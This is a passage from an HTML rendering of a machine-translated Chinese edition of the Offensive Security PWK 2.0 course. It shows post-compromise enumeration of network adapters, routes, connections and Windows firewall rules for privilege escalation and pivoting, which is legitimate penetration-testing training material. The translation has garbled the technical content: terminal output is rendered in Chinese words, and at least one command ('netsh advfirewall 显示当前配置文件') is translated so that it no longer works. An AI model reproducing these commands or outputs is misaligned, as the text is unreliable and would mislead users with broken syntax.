<div style="position:absolute;top:93599;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成立 2284</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93616;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 127.0.0.1:49691    </font></font></nobr></div>
<div style="position:absolute;top:93616;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:49692    </font></font></nobr></div>
<div style="position:absolute;top:93616;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成立 2284</font></font></nobr></div>
<div style="position:absolute;top:93633;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 127.0.0.1:49692    </font></font></nobr></div>
<div style="position:absolute;top:93633;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:49691    </font></font></nobr></div>
<div style="position:absolute;top:93633;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成立 2284</font></font></nobr></div>
<div style="position:absolute;top:93650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:93669;left:214"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 526 - 列出 Windows 操作系统上的所有活动网络连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93699;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅</font><font style="vertical-align: inherit;">为我们提供了机器上所有监听端口的列表，它还包括</font></font></nobr></div>
<div style="position:absolute;top:93718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关已建立连接的信息，这些信息可能会泄露连接到此计算机的其他用户</font></font></nobr></div>
<div style="position:absolute;top:93737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可能想稍后定位。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:93899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">455 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:94027;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="80"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 80 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:94060;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:95137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:95137;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:95137;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">521</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似的命令在基于 Linux 的主机上可用。</font><font style="vertical-align: inherit;">根据 Linux 的版本，我们可以</font></font></nobr></div>
<div style="position:absolute;top:94175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ifconfig</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 456</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出每个网络适配器的 TCP/IP 配置</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">457</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两个</font></font></nobr></div>
<div style="position:absolute;top:94195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令接受</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志以显示所有可用信息。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip a</font></font></font></b></nobr></div>
<div style="position:absolute;top:94246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:94264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast 状态 UP 组</font></font></nobr></div>
<div style="position:absolute;top:94280;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接/以太 00:50:56:8a:4d:48 brd ff:ff:ff:ff:ff:ff</font></font></nobr></div>
<div style="position:absolute;top:94297;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.128/24</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> brd 10.11.0.255 范围全球 ens192</font></font></nobr></div>
<div style="position:absolute;top:94314;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">valid_lft 永远首选_lft 永远</font></font></nobr></div>
<div style="position:absolute;top:94331;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet6 fe80::250:56ff:fe8a:4d48/64 范围链接 </font></font></nobr></div>
<div style="position:absolute;top:94348;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">valid_lft 永远首选_lft 永远</font></font></nobr></div>
<div style="position:absolute;top:94365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast 状态 UP 组</font></font></nobr></div>
<div style="position:absolute;top:94382;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接/以太 00:50:56:8a:5c:5e brd ff:ff:ff:ff:ff:ff</font></font></nobr></div>
<div style="position:absolute;top:94399;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.112/24</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> brd 192.168.1.255 范围全局 ens224</font></font></nobr></div>
<div style="position:absolute;top:94416;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">valid_lft 永远首选_lft 永远</font></font></nobr></div>
<div style="position:absolute;top:94433;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet6 fe80::250:56ff:fe8a:5c5e/64 范围链接 </font></font></nobr></div>
<div style="position:absolute;top:94450;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">valid_lft 永远首选_lft 永远</font></font></nobr></div>
<div style="position:absolute;top:94469;left:223"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 527 - 列出 Linux 上所有可用适配器上的完整 TCP/IP 配置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，Linux 客户端也连接到多个网络。</font></font></nobr></div>
<div style="position:absolute;top:94532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">route</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 458</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">routel</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">459</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示网络路由表</font><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">具体取决于 Linux</font></font></nobr></div>
<div style="position:absolute;top:94551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">味道和版本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sbin/route</font></font></font></b></nobr></div>
<div style="position:absolute;top:94603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核IP路由表</font></font></nobr></div>
<div style="position:absolute;top:94620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地网关    </font></font></nobr></div>
<div style="position:absolute;top:94620;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基因掩码    </font></font></nobr></div>
<div style="position:absolute;top:94620;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标记指标参考使用 Iface</font></font></nobr></div>
<div style="position:absolute;top:94637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认    </font></font></nobr></div>
<div style="position:absolute;top:94637;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.254 0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:94637;left:498"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UG 0 0 0 ens192</font></font></nobr></div>
<div style="position:absolute;top:94654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.0 0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:94654;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.0 U 0 0 0 ens224</font></font></nobr></div>
<div style="position:absolute;top:94671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.0 0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:94671;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.0 U 0 0 0 ens192</font></font></nobr></div>
<div style="position:absolute;top:94690;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 528 - 在 Linux 上打印路由</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 460</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:94739;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">461</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两者都接受相同的参数。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有连接</font><font style="vertical-align: inherit;">，避免主机名解析（这可能会使</font></font></nobr></div>
<div style="position:absolute;top:94791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令执行）使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出连接所属的进程名称</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:94811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组合参数并简单地运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -anp</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss -anp</font></font></font></b></nobr></div>
<div style="position:absolute;top:94863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netid 状态 Recv-Q Send-Q 本地地址：端口 对端地址：端口    </font></font></nobr></div>
<div style="position:absolute;top:94879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:94896;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp 听 0 80 127.0.0.1:3306</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94896;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*:*    </font></font></nobr></div>
<div style="position:absolute;top:94913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp 监听 0 128 *:22    </font></font></nobr></div>
<div style="position:absolute;top:94913;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*:*    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:94930;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp ESTAB 0 48852 10.11.0.128:22 10.11.0.4:52804</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:94987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">456 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Fred N. van Kempen，2003 年），https://linux.die.net/man/8/ifconfig</font></font></font></nobr></div>
<div style="position:absolute;top:95007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">457 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2011 年），http://man7.org/linux/man-pages/man8/ip.8.html</font></font></font></nobr></div>
<div style="position:absolute;top:95027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">458 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（菲尔·布伦德尔，2003 年），https://linux.die.net/man/8/route</font></font></font></nobr></div>
<div style="position:absolute;top:95047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">459 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2008 年），http://man7.org/linux/man-pages/man8/routel.8.html</font></font></font></nobr></div>
<div style="position:absolute;top:95067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">460 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（伯恩德·埃肯费尔斯，2003 年），https://linux.die.net/man/8/netstat</font></font></font></nobr></div>
<div style="position:absolute;top:95087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">461 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2019 年），http://man7.org/linux/man-pages/man8/ss.8.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:95215;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="81"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 81 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:95248;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:96325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:96325;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:96325;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">522</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp 监听 0 128 :::22    </font></font></nobr></div>
<div style="position:absolute;top:95344;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:95360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp 听 0 2 ::1:3350    </font></font></nobr></div>
<div style="position:absolute;top:95360;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:95377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp 监听 0 2 :::3389    </font></font></nobr></div>
<div style="position:absolute;top:95377;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*</font></font></nobr></div>
<div style="position:absolute;top:95397;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 529 - 列出 Linux 上的所有活动网络连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出列出了各种侦听端口和活动会话，包括我们自己的活动 SSH</font></font></nobr></div>
<div style="position:absolute;top:95446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95480;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.6 枚举防火墙状态和规则</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，防火墙的状态、配置文件和规则仅在远程访问期间感兴趣。</font></font></nobr></div>
<div style="position:absolute;top:95534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估的开发阶段。</font><font style="vertical-align: inherit;">但是，此信息在特权期间很有用</font></font></nobr></div>
<div style="position:absolute;top:95553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升级。</font><font style="vertical-align: inherit;">例如，如果网络服务由于被阻止而无法远程访问</font></font></nobr></div>
<div style="position:absolute;top:95572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙，它通常可以通过环回接口在本地访问。</font><font style="vertical-align: inherit;">如果我们可以与这些互动</font></font></nobr></div>
<div style="position:absolute;top:95592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地服务，我们可能能够利用它们来提升我们在本地系统上的权限。</font></font></nobr></div>
<div style="position:absolute;top:95625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，我们可以在此阶段收集有关入站和出站端口过滤的信息</font></font></nobr></div>
<div style="position:absolute;top:95644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在需要转向内部网络时促进端口转发和隧道化。</font></font></nobr></div>
<div style="position:absolute;top:95677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 462</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">检查当前的防火墙配置文件</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh advfirewall 显示当前配置文件</font></font></font></b></nobr></div>
<div style="position:absolute;top:95746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公开个人资料设置：</font></font></nobr></div>
<div style="position:absolute;top:95763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:95780;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态    </font></font></b></nobr></div>
<div style="position:absolute;top:95780;left:360"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙策略    </font></font></nobr></div>
<div style="position:absolute;top:95797;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阻止入站，允许出站</font></font></nobr></div>
<div style="position:absolute;top:95814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地防火墙规则    </font></font></nobr></div>
<div style="position:absolute;top:95814;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用（仅限 GPO 存储）</font></font></nobr></div>
<div style="position:absolute;top:95831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地安全规则    </font></font></nobr></div>
<div style="position:absolute;top:95831;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用（仅限 GPO 存储）</font></font></nobr></div>
<div style="position:absolute;top:95848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入站用户通知    </font></font></nobr></div>
<div style="position:absolute;top:95848;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使能够</font></font></nobr></div>
<div style="position:absolute;top:95864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程管理    </font></font></nobr></div>
<div style="position:absolute;top:95864;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用</font></font></nobr></div>
<div style="position:absolute;top:95881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单播响应到多播启用</font></font></nobr></div>
<div style="position:absolute;top:95916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记录：</font></font></nobr></div>
<div style="position:absolute;top:95932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日志允许连接数    </font></font></nobr></div>
<div style="position:absolute;top:95932;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用</font></font></nobr></div>
<div style="position:absolute;top:95949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日志删除连接    </font></font></nobr></div>
<div style="position:absolute;top:95949;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用</font></font></nobr></div>
<div style="position:absolute;top:95966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件名    </font></font></nobr></div>
<div style="position:absolute;top:95966;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%systemroot%\system32\LogFiles\Firewall\pfirewall.log</font></font></nobr></div>
<div style="position:absolute;top:95983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最大文件大小    </font></font></nobr></div>
<div style="position:absolute;top:95983;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4096</font></font></nobr></div>
<div style="position:absolute;top:96017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font></font></nobr></div>
<div style="position:absolute;top:96037;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 530 - 列出 Windows 上防火墙的当前配置文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，当前的防火墙配置文件是活动的，所以让我们仔细看看防火墙规则。</font></font></nobr></div>
<div style="position:absolute;top:96099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用以下语法使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">列出防火墙规则</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh advfirewall firewall show rule name=all</font></font></font></b></nobr></div>
<div style="position:absolute;top:96168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规则名称：    </font></font></nobr></div>
<div style="position:absolute;top:96168;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@{Microsoft.Windows.Photos_2018.18022.15810.1000_x86__8wekyb3d8bbw</font></font></nobr></div>
<div style="position:absolute;top:96185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ——</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96202;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用：    </font></font></b></nobr></div>
<div style="position:absolute;top:96202;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></b></nobr></div>
<div style="position:absolute;top:96219;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方向：    </font></font></b></nobr></div>
<div style="position:absolute;top:96219;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:96275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">462 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts</font></font></font></nobr></div>
</span></font>

